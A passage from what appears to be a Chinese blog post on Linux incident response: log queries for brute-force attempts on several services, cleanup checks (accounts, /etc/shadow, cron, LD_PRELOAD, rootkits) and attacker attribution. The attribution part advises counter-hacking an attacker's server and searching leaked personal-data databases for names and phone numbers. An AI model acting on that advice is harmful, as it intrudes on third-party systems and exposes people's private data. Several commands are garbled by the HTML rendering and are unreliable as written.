class="hljs-string">&#x27;ESTABLISHED.*sshd&#x27;</span><br>pgrep -af sshd<br>echo $SSH_CONNECTION<br>ss | <span class="hljs-keyword">grep</span> ssh<br></code></pre></td></tr></table></figure><ol><li>查看所有的账号信息</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span>（Ubuntu）<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure（centOS）<br>列出当前账户         <br>who am i<br></code></pre></td></tr></table></figure><ol><li>查看登录日志</li></ol><blockquote><p>查看日志 cd &#x2F;var&#x2F;log<br>成功登录 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Accept”<br>正常退出 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “pam_unix(sshd:session): session closed”<br>密码错误 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “authentication failure”<br>连续错误 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “message repeated 2 times”</p></blockquote><ol><li>统计数据</li></ol><blockquote><p>登录失败的用户名及其次数<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;auth.log|perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?)from&#x2F;; print”$1\n”;}’|sort|uniq -c|sort -nr</p><p>登录失败的 IP 及其次数<br>cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Failed password for” | grep “root” | grep -Po ‘(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}’ |sort|uniq -c|sort -nr</p></blockquote><ol><li>加固防护<br>升级 SSH 版本至少为 7.7 版本以上，7.7 及以下版本存在 SSH 用户名枚举<br>加强口令复杂程度<br>禁止 root 用户登录，可以通过其他用户 su 到 root<br>安装 <code>fail2ban</code> 来进行防御</li></ol><h2 id="Mysql-暴力破解"><a href="#Mysql-暴力破解" class="headerlink" title="Mysql 暴力破解"></a><strong>Mysql 暴力破解</strong></h2><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li>查看登录失败的用户名</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password: YES&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>查看登录失败的 IP 及次数</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password: YES&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-keyword">sort</span>| uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><h2 id="FTP-暴力破解"><a href="#FTP-暴力破解" class="headerlink" title="FTP 暴力破解"></a><strong>FTP 暴力破解</strong></h2><ol><li>查看网络连接（如果有爆破会有大量的 ESTABLISHED 状态和 TIME WAIT 状态的网络连接）</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -pantu</span><br></code></pre></td></tr></table></figure><ol><li>查看最近的一个 ftp 会话（也可以用 ftpwho 查找）</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">last</span> -w -t<br></code></pre></td></tr></table></figure><ol><li>查找日志</li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/vsftpd.<span class="hljs-keyword">log</span>   具体的位置可能不太一样，需要自己查找<br></code></pre></td></tr></table></figure><ol><li>查找登录失败的账号</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">cat /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/vsftpd.<span class="hljs-built_in">log</span> | grep FAIL | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;[&quot;</span> -f <span class="hljs-number">3</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;]&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-built_in">sort</span> | uniq -c | <span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>查找登录失败的 IP</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/vsftpd.log | grep FAIL | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;[&quot;</span> -f 3 | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;]&quot;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line;<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>;<span class="hljs-built_in">cat</span> /var/log/vsftpd.log | grep <span class="hljs-variable">$line</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 7 | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;&quot;&#x27;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><ol><li>FTP 服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h2 id="Redis-未授权暴力破解"><a href="#Redis-未授权暴力破解" class="headerlink" title="Redis 未授权暴力破解"></a><strong>Redis 未授权暴力破解</strong></h2><p>将 redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码</p><p>缩减开放端口，建议仅在本机 127.0.0.1 使用</p><p>配置完成后需要重启来生效</p><ul><li>只有手动设置 logfile 才能保存日志，默认不设置默认的日志级别 notice 是不会记录登录、执行指令、退出的。</li><li>loglevel 设置为 verbose 或者 debug 才会记录登录主机</li><li>执行的指令 <code>info，set</code> 等即使 loglevel 是 debug 级别也不会记录，但是会记录我们设置了多少个 key， 具体 key 名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h2 id="MongoDB-暴力破解"><a href="#MongoDB-暴力破解" class="headerlink" title="MongoDB 暴力破解"></a><strong>MongoDB 暴力破解</strong></h2><p>默认配置文件位置为 &#x2F;etc&#x2F;mongodb.conf</p><p>默认的的日志位置为 &#x2F;var&#x2F;og&#x2F;mongodb&#x2F;mongodb.log</p><p>打开 verbose 后能看到大量的 failed 事件</p><p>在&#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongodb.log 查看</p><ol><li>登录失败的账户</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="hljs-keyword">sort</span>|uniq -c|<span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>登录所有账户失败的 IP 及次数</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> |<span class="hljs-keyword">sort</span> | uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log |<span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span> | <span class="hljs-keyword">grep</span> failed | <span class="hljs-keyword">grep</span> $line | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $14&#125;&#x27;</span> | cut -d <span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><ol><li>不存在账户的爆破事件</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> |<span class="hljs-keyword">sort</span> | uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log |<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;UserNotFound&quot;</span> | <span class="hljs-keyword">grep</span> failed | <span class="hljs-keyword">grep</span> $line | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $14&#125;&#x27;</span> | cut -d <span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><h2 id="SMTP-暴力破解"><a href="#SMTP-暴力破解" class="headerlink" title="SMTP 暴力破解"></a><strong>SMTP 暴力破解</strong></h2><p>SMTP 负责发，POP3、IMAP 负责收，POP3 协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。</p><p>IMAP 则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">验证失败的账户IP<br><span class="hljs-keyword">cat</span> /var/<span class="hljs-built_in">log</span>/mail.<span class="hljs-built_in">log</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;authentication failed&quot;</span> | <span class="hljs-keyword">grep</span> -Po <span class="hljs-string">&#x27;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|</span><br></code></pre></td></tr></table></figure><h1 id="善后处理"><a href="#善后处理" class="headerlink" title="善后处理"></a>善后处理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a><strong>杀死进程</strong></h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mel">top d1   <span class="hljs-comment">//运行top命令后，键入大写字母P按cpu排序</span><br>ps aux | <span class="hljs-keyword">sort</span> -k4nr   <span class="hljs-comment">//运行top命令后，键入大写字母M按内存排序</span><br><span class="hljs-keyword">ls</span> -la /<span class="hljs-keyword">proc</span>/$pid/exe   <span class="hljs-comment">//查找进程文件</span><br>strace -tt  -T -e  <span class="hljs-keyword">trace</span>=all  -p $pid   <span class="hljs-comment">//跟踪进程运行</span><br>lsof -p $pid   <span class="hljs-comment">//进程打开的文件</span><br>netstat -anltp | grep $pid   <span class="hljs-comment">//查看进程端口情况</span><br></code></pre></td></tr></table></figure><h2 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a><strong>查看账号</strong></h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stata">awk -F <span class="hljs-string">&quot;:&quot;</span> &#x27;<br><span class="hljs-variable">$3</span>==0&#123;<span class="hljs-keyword">print</span> $<br>1&#125;&#x27; /etc/passwd   <span class="hljs-comment">//查看特权用户</span><br>awk &#x27;/\<br><span class="hljs-variable">$1</span>|\$<br>6/&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; /etc/shadow   <span class="hljs-comment">//可远程登录的账号信息</span><br><span class="hljs-keyword">cat</span> /etc/sudoers | grep -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | grep <span class="hljs-string">&quot;ALL=(ALL)&quot;</span>   <span class="hljs-comment">//sudo的账号</span><br>w   <span class="hljs-comment">//当前用户及其行为</span><br>lastlog   <span class="hljs-comment">//所有用户最后登录时间</span><br>last   <span class="hljs-comment">//所有用户关键信息</span><br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#x27;&#123;<span class="hljs-keyword">print</span> <br><span class="hljs-variable">$1</span>,$<br>2,<br><span class="hljs-variable">$3</span>,$<br>9,<span class="hljs-variable">$11&#125;</span>&#x27;   <span class="hljs-comment">//成功登录日期、用户名及ip</span><br><span class="hljs-comment">//查看试图爆破主机的ip</span><br>grep refused /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c |<span class="hljs-keyword">sort</span> -nr | <span class="hljs-keyword">more</span><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep -<span class="hljs-keyword">E</span> -o <span class="hljs-string">&quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot;</span> | uniq -c <br>grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span>   <span class="hljs-comment">//查看爆破root的ip</span><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr   <span class="hljs-comment">//查看爆破的用户名字典</span><br></code></pre></td></tr></table></figure><h2 id="锁定目录"><a href="#锁定目录" class="headerlink" title="锁定目录"></a><strong>锁定目录</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 000 /usr/bin/风险目录<br>chattr +i /usr/bin<br>chattr +i /bin<br>chattr +i /tmp<br></code></pre></td></tr></table></figure><h2 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a><strong>检查异常文件</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">【检查特权文件】<br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">6000</span><br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">4000</span><br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">2000</span><br>【检查corn文件】<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br><span class="hljs-regexp">/etc/</span>crontab <br><span class="hljs-regexp">/etc/</span>cron.d/* <br><span class="hljs-regexp">/etc/</span>cron.daily/*<br><span class="hljs-regexp">/etc/</span>cron.hourly/* <br><span class="hljs-regexp">/etc/</span>cron.monthly/* <br><span class="hljs-regexp">/etc/</span>cron.weekly/ <br><span class="hljs-regexp">/etc/</span>anacrontab     <br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>*<br>【最近被修改的系统文件】<br>find <span class="hljs-regexp">/etc/</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ /u</span>sr<span class="hljs-regexp">/sbin/</span> <span class="hljs-regexp">/bin/</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>  -type f -mtime -T | xargs ls -la<br>【被替换的命令/动态链接库劫持】<br>echo <span class="hljs-variable">$LD_PRELOAD</span><br>echo <span class="hljs-variable">$LD_LIBRARY_PATH</span><br>注：基本上上面两个命令回显是空白的，如果有回显大概率是被劫持<br>ls -alt <span class="hljs-regexp">/usr/</span>bin <span class="hljs-regexp">/usr/</span>sbin <span class="hljs-regexp">/bin /u</span>sr<span class="hljs-regexp">/local/</span>bin<br>rpm -Va&gt;rpm.log<br></code></pre></td></tr></table></figure><h2 id="删除计划任务等"><a href="#删除计划任务等" class="headerlink" title="删除计划任务等"></a><strong>删除计划任务等</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -f <span class="hljs-regexp">/etc/i</span>nit.d/风险目录<br>rm -f <span class="hljs-regexp">/etc/</span>rc<span class="hljs-comment">#.d/木马连接文件</span><br>cat <span class="hljs-regexp">/etc/</span>rc.local   <span class="hljs-regexp">//</span>开机启动项<br>chkconfig --list   <span class="hljs-regexp">//</span>开机启动项<br>注意：建议使用vim查看，cat有可能显示不全<br></code></pre></td></tr></table></figure><h2 id="rootkit-查杀"><a href="#rootkit-查杀" class="headerlink" title="rootkit 查杀"></a><strong>rootkit 查杀</strong></h2><p>rootkit 主要有两种类型：文件级别和内核级别。<br>文件级别的 rootkit: 一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。<br>内核级 rootkit: 是比文件级 rootkit 更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级 rootkit 主要依附在内核上，它并不对系统文件做任何修改。以防范为主。<br><strong>查杀工具：</strong><br><a href="http://www.chkrootkit.org/">chkrootkit </a>、<a href="http://rkhunter.sourceforge.net/"> rkhunter </a>、<a href="http://www.clamav.net/download.html"> ClamAV</a></p><h2 id="其它检查方面"><a href="#其它检查方面" class="headerlink" title="其它检查方面"></a><strong>其它检查方面</strong></h2><ul><li>BASH 内置命令</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">compgen -<span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure><ul><li>BASH 函数</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">compgen <span class="hljs-operator">-f</span><br>unset <span class="hljs-operator">-f</span> functionName<br></code></pre></td></tr></table></figure><ul><li>环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span><br><span class="hljs-built_in">set</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/environ<br><span class="hljs-built_in">declare</span><br></code></pre></td></tr></table></figure><ul><li>SSH key</li><li>SSH config 文件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/ssh_config 和 ~/</span>.ssh/config将<br>LocalCommand 和 ProxyCommand 参数封禁<br></code></pre></td></tr></table></figure><ul><li>alias 命令替换</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">alias 命令的功能是为命令设置别名<br>alert   <span class="hljs-regexp">//</span>检查是否存在替换<br>unalias alert   <span class="hljs-regexp">//</span>删除别名<br></code></pre></td></tr></table></figure><ul><li>DNS 配置文件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>resolv.conf<br></code></pre></td></tr></table></figure><ul><li>禁止 ptrace_scope 操作</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/y</span>ama/ptrace_scope<br></code></pre></td></tr></table></figure><ul><li>ASLR</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space   <span class="hljs-regexp">//</span>调成<span class="hljs-number">2</span>减缓溢出攻击<br></code></pre></td></tr></table></figure><ul><li>capabilities</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>   <span class="hljs-comment">//查看对权限的默认情况</span><br>setcap   <span class="hljs-comment">//重新设置权限</span><br></code></pre></td></tr></table></figure><ul><li>iptables 端口复用</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo iptables -L   <span class="hljs-regexp">//</span>查看默认情况<br></code></pre></td></tr></table></figure><ul><li>密码填充检查</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 2 | grep -v <span class="hljs-string">&quot;x   //默认情况应该是空的</span><br></code></pre></td></tr></table></figure><ul><li>服务检查</li></ul><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span> <span class="hljs-built_in">--type=service</span> <span class="hljs-built_in">--state=running</span>   //正在运行的服务<br><span class="hljs-string">systemctl</span> <span class="hljs-string">status</span> <span class="hljs-string">xxx</span>.<span class="hljs-string">service</span>   //查看单一服务进程状态<br><span class="hljs-string">systemctl</span> <span class="hljs-string">cat</span> <span class="hljs-string">xxx</span>.<span class="hljs-string">service</span>   //获取服务配置文件<br><span class="hljs-string">systemctl</span> <span class="hljs-string">cat</span><br></code></pre></td></tr></table></figure><ul><li>MOTD</li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">是Linux中发送问候消息的功能，一般在我们登录服务器后显示<br>每次任意用户登录时都会触发 motd 服务的功能,这个功能的脚本几乎都是使用<span class="hljs-built_in"> root</span> 权限来启动的，所以很适合用来做后门<br></code></pre></td></tr></table></figure><ul><li>进程启动文件</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序<br>sudo lsof | <span class="hljs-keyword">grep</span> deleted<br>sudo ls -al <span class="hljs-regexp">/proc/</span>*<span class="hljs-regexp">/exe 2&gt;/</span>dev<span class="hljs-regexp">/null | grep deleted   /</span><span class="hljs-regexp">/建议使用这一个命令</span><br></code></pre></td></tr></table></figure><ul><li>检查系统及应用程序配置文件</li><li>sudo 配置文件检查</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>sudo.conf<br><span class="hljs-regexp">/etc/</span>sudoers<br><span class="hljs-regexp">/etc/</span>sudoers.d/<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">第三方GPG密钥检查<br><br>sudo apt-key list<br>具体存储⽬录为 /etc/apt/<span class="hljs-keyword">trusted</span>.gpg.d/<br></code></pre></td></tr></table></figure><p>gpg –quiet –show-keys &#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;*</p><p>具体存储⽬录为 &#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;</p><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>溯源思路：</p><ol><li><p>首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的 ip 和攻击方式，通过 webshell 或者木马去微步分析，</p></li><li><p>或者去安恒威胁情报中心进行 ip 检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois 等进行判断，</p></li><li><p>获取姓名电话等丢社工库看看能不能找到更多信息然后收工</p></li></ol><p>针对国外 IP 的溯源方法：</p><ol><li>使用网络安全工具进行溯源：可以使用网络安全工具，如 traceroute、ping 等命令，对目标 IP 进行探测和跟踪。这些工具可以显示出攻击流量经过的路由器、网关和 ISP 等信息，帮助我们了解攻击流量的来源地点。</li><li>查找域名信息：通过 WHOIS 查询工具查询目标域名的注册信息，包括注册人、注册机构、联系方式等信息，可以从中了解到攻击来源的大致位置。</li><li>联系当地 ISP：如果攻击者使用的是公共网络，如酒店、咖啡厅、机场等，可以联系当地 ISP，寻求协助获取攻击来源的信息。</li></ol><h2 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h2><p>主要是通过混淆和伪装攻击流量，防止攻击者获取真实的攻击来源和行为信息。具体操作包括：<br>    1.使用代理服务器：通过使用代理服务器，可以改变攻击流量的来源 IP 地址，使得攻击者无法追踪真实的攻击来源。<br>    2.使用 